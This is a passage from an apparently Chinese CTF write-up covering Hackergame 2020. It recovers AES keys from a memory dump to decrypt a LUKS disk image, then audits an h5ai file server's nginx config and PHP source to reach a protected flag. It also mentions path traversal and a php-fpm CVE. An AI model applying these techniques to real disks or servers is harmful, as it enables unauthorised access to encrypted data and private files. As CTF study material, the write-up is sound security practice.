0x1337cb08:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1fFound AES-256 key schedule at offset 0x1337cbfc:6b c7 7b d3 28 b3 78 31 5a 19 3c 7d fa 0d 14 c2 f0 23 f5 56 55 64 de 40 a6 ba 66 d2 9a ed fd 3dFound AES-256 key schedule at offset 0x14e67de4:31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9cFound AES-256 key schedule at offset 0x1618ca1a:e4 d5 8f 63 d6 29 f3 88 03 da 3c 71 2c 5a 0c c2 be 77 4b 9d 92 5d 13 60 24 a1 81 31 5d 91 ac 99Found AES-256 key schedule at offset 0x1618cc0e:13 6c e9 ce 0d 3f 13 0e be 62 95 70 a0 8b c2 ea 88 3e 45 15 33 87 51 40 02 7d 1b 3f db 5d 00 91Found AES-256 key schedule at offset 0x1632db50:31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9cFound AES-256 key schedule at offset 0x171c873a:fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6Found AES-256 key schedule at offset 0x171c890d:e4 58 16 75 c3 f9 47 f7 b5 37 a3 <span class="token function">dd</span> 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1Found AES-256 key schedule at offset 0x17d08b20:4c 82 f3 49 3f 9a 33 81 f5 1c 39 4a b8 53 2b d0 37 db 64 b7 93 05 7a ad e3 d6 bf 67 cb eb f9 33Found AES-256 key schedule at offset 0x19013349:fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6Found AES-256 key schedule at offset 0x1901351c:e4 58 16 75 c3 f9 47 f7 b5 37 a3 <span class="token function">dd</span> 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1</code></pre><p>用 losetup 将磁盘镜像文件虚拟成 loop 设备。</p><p>这里用第三个分区，起始的偏移为 1892352 * 512 = 968884224 bytes。</p><blockquote><p>循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> losetup --offset 968884224 /dev/loop30 roommates_disk_part.img</code></pre><p>然后可以用 <code>ls /dev/loop*</code> 看到有 loop30 了。</p><p>随意把一行的 AES Key 拿去解密，发现也是提示 </p><blockquote><p>Cannot read 64 bytes from keyfile key0.</p></blockquote><p>题目提示 <strong>AES512</strong>，这里解密出来的 AES256 密钥长度不够。于是就得把两个拼一起拿去解密，而且理论上应该是两个连续的密钥拼一起。</p><p>然而我就卡这里了。只想到正着拼接，没想到反过来连接。。</p><p>参考官方 WP 给的 <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e" target="_blank" rel="noopener"><strong>Breaking Full Disk Encryption from a Memory Dump</strong></a> 一文，由于用的是小端序，这里应该反过来拼接。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107202423595.png" alt="参考博客"></p><p>试了半天发现是最后两条，而且还出现了两次。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">></span> key0</code></pre><p>然后用 <code>key0</code> 去解密镜像。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> cryptsetup luksOpen --master-key-file key0 /dev/loop30 decrypted</code></pre><p>没有报错，然后再把这个 loop 给挂载上。最后进去拿到 flag。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /mnt/hackergame<span class="token function">sudo</span> <span class="token function">mount</span> /dev/mapper/decrypted /mnt/hackergame<span class="token function">cd</span> /mnt/hackergame/<span class="token comment" spellcheck="true"># ...</span><span class="token function">cat</span> flag.txt</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184050381.png" alt="flag"></p><p>最后再取消挂载，卸载 loop 设备。有始有终嘛。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">umount</span> /mnt/hackergame<span class="token function">sudo</span> losetup -d /dev/loop30<span class="token function">sudo</span> <span class="token function">rm</span> -rf /mnt/hackergame</code></pre><blockquote><p>其他 References &amp; Extensive Reading：</p><p><a href="https://raksec.blogspot.com/2016/05/forensics-ctf-challenge-fbios-writeup.html" target="_blank" rel="noopener">Forensics CTF challenge - FBiOS writeup</a></p><p><a href="https://g0blin.co.uk/hack-lu-ctf-2015-dr-bob-writeup/" target="_blank" rel="noopener">Hack.lu CTF 2015 - Forensics 150: Dr. Bob Writeup（较简单）</a></p><p><a href="http://aes.online-domain-tools.com/" target="_blank" rel="noopener">AES – Symmetric Ciphers Online 一个在线的 AES 解密网站</a></p><p><a href="https://www.jianshu.com/p/b58449b43981" target="_blank" rel="noopener">迅雷网心云x86版虚拟机硬盘解密</a></p></blockquote><hr><h2 id="超简易的网盘服务器"><a href="#超简易的网盘服务器" class="headerlink" title="超简易的网盘服务器"></a>超简易的网盘服务器</h2><blockquote><p>登录了服务器后台的小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href="http://202.38.93.111:10120/" target="_blank" rel="noopener">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href="http://202.38.93.111:10120/Public" target="_blank" rel="noopener">/Public</a> 目录来共享文件！”</p><p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href="http://202.38.93.111:10120/" target="_blank" rel="noopener">根目录</a>。</p></blockquote><p>这题老馋了，做了好久才整出来，还是太菜了，我自己爬。</p><p>访问 /Public 目录，可以得到 <code>nginx.conf</code> 以及 <code>Dockerfile</code>。</p><p>关键代码：</p><pre class=" language-dockerfile"><code class="language-dockerfile">FROM alpine:latestEXPOSE 10120WORKDIR /var/www/htmlRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \    && apk add nginx supervisor php7-fpm php7-session php7-json php7-gd php7-exif git wget unzip zip\    && mkdir -p /var/www/html/Public \    && wget https://release.larsjung.de/h5ai/h5ai-0.29.2.zip \    && unzip h5ai-0.29.2.zip \    && cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai \    && rm h5ai-0.29.2.zip \    && mkdir /run/nginxADD ./supervisord.conf /etc/supervisor/conf.d/supervisord.confADD ./nginx.conf /etc/nginx/nginx.confADD ./php.ini /etc/php7/php.iniRUN rm /etc/nginx/conf.d/default.confRUN chown -R nobody.nobody /var/www/html && \  chown -R nobody.nobody /run && \  chown -R nobody.nobody /var/lib/nginx && \  chown -R nobody.nobody /var/log/nginx && \  chown -R nobody.nobody /var/log/php7USER nobodyADD --chown=nobody ./flag.txt /var/www/html/ADD --chown=nobody ./dockerfile ./nginx.conf /var/www/html/Public/CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]</code></pre><p><code>cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai</code>，这里看得出来<strong>有两个 <code>_h5ai</code></strong>，实际访问也是。</p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># Docker 内部的地址，无关紧要</span>    <span class="token keyword">listen</span> <span class="token number">10120</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> _<span class="token punctuation">;</span>    <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># _h5ai/private 文件夹下的内容是不可直接访问的，设置屏蔽</span>    <span class="token keyword">location</span> <span class="token operator">~</span> _h5ai<span class="token operator">/</span>private <span class="token punctuation">{</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">auth_basic</span> <span class="token string">"easy h5ai. For visitors, please refer to public directory at `/Public!`"</span><span class="token punctuation">;</span>        <span class="token keyword">auth_basic_user_file</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span>htpasswd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span>    <span class="token keyword">location</span> <span class="token operator">/</span>Public <span class="token punctuation">{</span>        <span class="token keyword">allow</span> all<span class="token punctuation">;</span>        <span class="token keyword">index</span> <span class="token operator">/</span>Public<span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span>    <span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>             <span class="token keyword">fastcgi_pass</span>   <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>             <span class="token keyword">fastcgi_index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>             <span class="token keyword">fastcgi_param</span>  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>             <span class="token keyword">include</span>        fastcgi_params<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>\<span class="token punctuation">.</span> <span class="token punctuation">{</span>        <span class="token keyword">log_not_found</span> off<span class="token punctuation">;</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（提一句，这个密钥文件说不好还不存在（x</p><p>（本地搭建就是这样，但不影响题目。</p><p>刚开始还以为是 Nginx 配置问题，可能路径穿越，例如 <code>/Public../</code>，<del>但不知道跑哪去了</del></p><p>本地搭建试了试，的确路由到 <code>/Public../</code> 目录下了，但不知道为啥列不出文件，文件下载倒是可以的。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012811728.png" alt="建立目录写入文件"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012726981.png" alt="列不出文件"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012907207.png" alt="能读取文件"></p><p>可能是需要设置 <code>alias</code>，开启 <code>autoindex</code>，才会有这个漏洞吧。</p><p>再想想，难道是 <a href="https://www.cnblogs.com/wuxinmengyi/p/11746193.html" target="_blank" rel="noopener">php-fpm在nginx特定环境下的任意代码执行漏洞（CVE-2019-11043）</a>？（GitHub <strong><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">phuip-fpizdam</a></strong>）</p><p>看了下也不是。</p><p>不行了不行了，感觉不是 nginx 的问题，<strong>得审计源码了</strong>。</p><p>根据 Nginx 配置，访问这个 <a href="http://202.38.93.111:10120/Public/_h5ai/public/index.php" target="_blank" rel="noopener">http://202.38.93.111:10120/Public/_h5ai/public/index.php</a> ，发现密码为空，有一些相关的信息。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011532703.png" alt="config"></p><p>把源码下载下来，这个<code>index.php</code>调用了 <code>class-bootstrap.php</code>。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/../private/php/class-bootstrap.php'</span><span class="token punctuation">;</span>Bootstrap<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>class-bootstrap.php</code> 里判断请求来源，判断是 api/info/else？</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Bootstrap'</span><span class="token punctuation">,</span> <span class="token string">'autoload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'LANG=en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setlocale</span><span class="token punctuation">(</span><span class="token constant">LC_CTYPE</span><span class="token punctuation">,</span> <span class="token string">'en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span>@<span class="token function">date_default_timezone_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Session</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'));</span>        <span class="token variable">$setup</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Setup</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query_boolean</span><span class="token punctuation">(</span><span class="token string">'refresh'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Context</span><span class="token punctuation">(</span><span class="token variable">$session</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$setup</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Api</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_info_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/pages/info.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_fallback_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$fallback_html</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Fallback</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/pages/index.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><code>class-context.php</code>:</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">setup</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'post'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>于是只要发个 POST 请求就能调用 API.</p><p>试试发现缺参数。</p><p>看调用： <code>(new Api($context))-&gt;apply();</code></p><p><code>class-api.php</code>:</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$supported</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'download'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token string">'logout'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">json_fail</span><span class="token punctuation">(</span>Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERR_UNSUPPORTED</span><span class="token punctuation">,</span> <span class="token string">'unsupported action'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$supported</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$methodname</span> <span class="token operator">=</span> <span class="token string">'on_'</span> <span class="token punctuation">.</span> <span class="token variable">$action</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$methodname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">on_download</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">json_fail</span><span class="token punctuation">(</span>Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERR_DISABLED</span><span class="token punctuation">,</span> <span class="token string">'download disabled'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query_option</span><span class="token punctuation">(</span><span class="token string">'download.enabled'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$as</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$base_href</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'baseHref'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$hrefs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'hrefs'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Archive</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span> <span class="token punctuation">.</span> <span class="token variable">$as</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Connection: close'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">json_fail</span><span class="token punctuation">(</span>Util<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERR_FAILED</span><span class="token punctuation">,</span> <span class="token string">'packaging failed'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$ok</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>我这里用了 <code>download</code> 方法，按照代码依次补上参数就完事了。</p><p><code>class-archive.php</code>:</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">to_path</span><span class="token punctuation">(</span><span class="token variable">$base_href</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">context</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_managed_path</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dirs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">add_hrefs</span><span class="token punctuation">(</span><span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dirs</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">php_tar</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dirs</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'shell-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">shell_cmd</span><span class="token punctuation">(</span>Archive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$TAR_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'shell-zip'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token 